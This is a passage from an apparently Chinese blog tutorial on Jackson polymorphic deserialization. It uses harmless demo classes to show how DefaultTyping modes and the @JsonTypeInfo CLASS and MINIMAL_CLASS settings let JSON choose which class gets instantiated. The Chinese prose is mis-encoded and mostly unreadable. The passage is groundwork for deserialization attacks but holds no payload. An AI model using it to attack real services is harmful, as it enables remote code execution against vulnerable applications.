class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// è®¾ç½®NON_CONCRETE_AND_ARRAYS  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_CONCRETE_AND_ARRAYS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span><span class="token string">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token string">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"[LHacker;"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>age<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token number">0</span>w0<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name">LHacker</span><span class="token punctuation">;</span><span class="token annotation punctuation">@5cb9f472</span><span class="token punctuation">,</span> <span class="token class-name">MySex</span><span class="token annotation punctuation">@cb644e</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç±»åå˜æˆäº† <code>&quot;[L&quot;+ç±»å+&quot;;&quot;</code></p><hr><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><blockquote><p>é™¤äº†å‰é¢çš„æ‰€æœ‰ç‰¹å¾å¤–ï¼ŒåŒ…å«å³å°†è¢«åºåˆ—åŒ–çš„ç±»é‡Œçš„å…¨éƒ¨ã€é final çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ•´ä¸ªç±»ã€é™¤ final å¤–çš„å±æ€§ä¿¡æ¯éƒ½éœ€è¦è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–</p></blockquote><p>ç»™ Person åŠ ä¸Š Hacker å±æ€§</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Hacker</span> hacker<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s, %s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">,</span> hacker <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> hacker<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NON_FINAL_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>hacker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è®¾ç½®NON_FINAL  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token string">"Person"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"hacker"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>Person.age=<span class="token number">6</span><span class="token punctuation">,</span> Person.name=0w0<span class="token punctuation">,</span> Hacker@42dafa95<span class="token punctuation">,</span> MySex@6500df86<span class="token punctuation">,</span> Hacker@402a079c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æˆåŠŸå¯¹é final çš„ hacker å±æ€§è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><hr><h3 id="JsonTypeInfo-æ³¨è§£"><a href="#JsonTypeInfo-æ³¨è§£" class="headerlink" title="@JsonTypeInfo æ³¨è§£"></a>@JsonTypeInfo æ³¨è§£</h3><p><code>@JsonTypeInfo</code> æ³¨è§£æ˜¯ Jackson å¤šæ€ç±»å‹ç»‘å®šçš„ä¸€ç§æ–¹å¼ï¼Œæ”¯æŒä¸‹é¢5ç§ç±»å‹çš„å–å€¼ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NONE</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">CLASS</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">MINIMAL_CLASS</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NAME</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">CUSTOM</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p>é»˜è®¤è®¾ç½®</p><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>èµ·ä¸€ä¸ª User ç±»ï¼ŒæŠŠ Hacker ç±»ç§»åˆ° com.example ä¸‹ï¼ŒæŒ‡å®šæ³¨è§£</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NAME</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"com.example.User&#123;"</span> <span class="token operator">+</span>                <span class="token string">"username='"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", password='"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", object="</span> <span class="token operator">+</span> object <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶ååºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Hacker</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JsonTypeInfo_Id_NONE_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">User</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>password <span class="token operator">=</span> <span class="token string">"******"</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">User</span> u2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>u2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"******"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@class"</span><span class="token operator">:</span><span class="token string">"com.example.Hacker"</span><span class="token punctuation">,</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>User<span class="token punctuation">&#123;</span>username='0w0'<span class="token punctuation">,</span> password='******'<span class="token punctuation">,</span> object=com.example.Hacker@25bbe1b6<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç›¸æ¯” NONE æ³¨è§£æ—¶ï¼Œobject å±æ€§ä¸­å¤šäº† <code>&quot;@class&quot;:&quot;com.example.Hacker&quot;</code>ï¼Œå³å«æœ‰å…·ä½“çš„ç±»çš„ä¿¡æ¯ï¼ŒåŒæ—¶ååºåˆ—åŒ–å‡ºæ¥äº† object å±æ€§ Hacker ç±»å¯¹è±¡ï¼Œå³èƒ½å¤ŸæˆåŠŸå¯¹æŒ‡å®šç±»å‹è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨Jacksonååºåˆ—åŒ–çš„æ—¶å€™å¦‚æœä½¿ç”¨äº†<code>JsonTypeInfo.Id.CLASS</code>ä¿®é¥°çš„è¯ï¼Œå¯ä»¥é€šè¿‡ @class çš„æ–¹å¼æŒ‡å®šç›¸å…³ç±»ï¼Œå¹¶è¿›è¡Œç›¸å…³è°ƒç”¨</p><hr><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>ä¿®æ”¹æ³¨è§£å€¼ä¸º<code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p><p>è¾“å‡ºï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"******"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@c"</span><span class="token operator">:</span><span class="token string">"com.example.Hacker"</span><span class="token punctuation">,</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>User<span class="token punctuation">&#123;</span>username='0w0'<span class="token punctuation">,</span> password='******'<span class="token punctuation">,</span> object=com.example.Hacker@69ea3742<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>objectå±æ€§ä¸­ <code>&quot;@c&quot;:&quot;com.example.Hacker&quot;</code>ï¼Œå³ä½¿ç”¨ @c æ›¿ä»£äº† @class</p><p>å®˜æ–¹æè¿°ä¸­çš„æ„æ€æ˜¯ç¼©çŸ­äº†ç›¸å…³ç±»åï¼Œå®é™…æ•ˆæœå’Œ JsonTypeInfo.Id.CLASS ç±»ä¼¼</p><hr><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>ä¿®æ”¹æ³¨è§£å€¼ä¸º<code>JsonTypeInfo.Id.NAME</code></p><p>è¾“å‡ºï¼š</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224172923965.png" alt="image-20241224172923965"></p><p>objectå±æ€§ä¸­<code>&quot;@type&quot;:&quot;Hacker&quot;</code>ï¼Œä¹ä¸€çœ‹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å®é™…ä¸Šæ²¡æœ‰å…·ä½“çš„åŒ…ååœ¨å†…çš„ç±»åï¼Œå› æ­¤åœ¨åé¢çš„ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè®¾ç½®å€¼æ˜¯ä¸èƒ½è¢«ååºåˆ—åŒ–åˆ©ç”¨çš„</p><hr><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>ç›´æ¥è¿è¡Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œéœ€è¦ç”¨æˆ·è‡ªå®šä¹‰æ¥ä½¿ç”¨</p><br><p>é‚£ä¹ˆå¯è§¦å‘ååºåˆ—åŒ–çš„æ³¨è§£å°±ä¸¤ä¸ªï¼š</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo.Id.MINIMAL_CLASS</li></ul><hr><h2 id="ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨"><a href="#ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨" class="headerlink" title="ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨"></a>ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨</h2><p>æ•´ä¸ª User2 ç±»ï¼ŒåŠ ä¸Š setter å’Œ getter</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ„é€ æ–¹æ³•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">User2</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token string">"0w0"</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span 